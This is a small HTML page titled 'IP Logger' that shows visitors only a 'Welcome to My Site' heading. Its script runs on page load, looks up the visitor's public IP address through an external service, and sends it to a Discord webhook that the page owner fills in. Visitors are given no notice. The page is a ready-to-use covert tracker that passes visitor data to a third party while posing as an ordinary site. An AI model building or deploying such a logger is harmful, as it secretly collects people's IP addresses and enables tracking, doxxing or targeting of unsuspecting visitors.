<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
</head>
<body>
    <h1>Welcome to My Site</h1>
    <script>
        // Replace this with your Discord webhook URL
        const webhookURL = 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN';

        // Fetch the IP address using an external API
        fetch('https://api.ipify.org?format=json')
            .then(response => response.json())
            .then(data => {
                // Prepare the payload for the Discord webhook
                const payload = {
                    content: `New visitor IP logged: ${data.ip}`
                };

                // Send the IP address to Discord via the webhook
                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                }).then(response => {
                    if (response.ok) {
                        console.log('IP logged successfully');
                    } else {
                        console.error('Failed to log IP:', response.statusText);
                    }
                }).catch(error => console.error('Error sending to webhook:', error));
            })
            .catch(error => console.error('Error fetching IP:', error));
    </script>
</body>
</html>
